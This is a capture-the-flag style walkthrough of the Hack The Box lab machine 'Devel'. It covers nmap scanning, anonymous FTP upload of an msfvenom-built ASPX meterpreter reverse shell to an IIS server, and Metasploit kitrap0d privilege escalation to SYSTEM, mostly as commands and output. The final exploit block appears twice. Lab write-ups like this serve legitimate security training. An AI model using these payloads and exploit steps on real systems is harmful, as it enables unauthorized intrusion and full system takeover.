# Devel

URL: https://app.hackthebox.com/machines/Devel

Level: Easy

Date 31 May 2020

## Walkthrough

- [Enumeration](#enumeration)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sat Apr  3 11:13:46 2021 as: nmap -Pn -p- -T4 -oN nmap.txt 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.044s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

# Nmap done at Sat Apr  3 11:15:16 2021 -- 1 IP address (1 host up) scanned in 90.09 seconds
```

```
# Nmap 7.80 scan initiated Sun May 31 17:52:00 2020 as: nmap -A -T4 -p- -oN nmap.txt 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.048s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 06-03-20  06:06PM                 2758 file.aspx
| 06-03-20  06:03PM                   17 file.txt
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   49.12 ms 10.10.14.1
2   49.40 ms 10.10.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 31 17:54:04 2020 -- 1 IP address (1 host up) scanned in 125.36 seconds
```

We can easily determine that through FTP service we are able to write stuff on website Document Root.

So we generate an ASP meterpreter reverse shell:

```
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx -o test.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2894 bytes
Saved as: test.aspx
``` 

We spawn our listener with `msfconsole`:

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp


msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.7
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.7:4444
```

and we browse our `test.aspx` file:

```
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.5:49159) at 2021-04-03 11:28:58 +0200
```

Our privilege belongs to IIS web server:

```
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

# Privesc

We use metasploit suggester:

```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
```

and we found `kitrap0d` exploit.

```
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     5556             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 6666
LPORT => 6666
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.21:4444 -> 10.10.10.5:49157 (10.10.10.5)

msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     6666             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.21:6666
[*] Launching notepad to host the exploit...
[+] Process 3580 launched.
[*] Reflectively injecting the exploit DLL into 3580...
[*] Injecting exploit into 3580 ...
[*] Exploit injected. Injecting payload into 3580...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.21:6666 -> 10.10.10.5:49158) at 2021-04-05 22:52:18 +0200

meterpreter > shell
Process 3756 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     5556             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 6666
LPORT => 6666
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.21:4444 -> 10.10.10.5:49157 (10.10.10.5)

msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     6666             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.21:6666
[*] Launching notepad to host the exploit...
[+] Process 3580 launched.
[*] Reflectively injecting the exploit DLL into 3580...
[*] Injecting exploit into 3580 ...
[*] Exploit injected. Injecting payload into 3580...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.21:6666 -> 10.10.10.5:49158) at 2021-04-05 22:52:18 +0200

meterpreter > shell
Process 3756 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

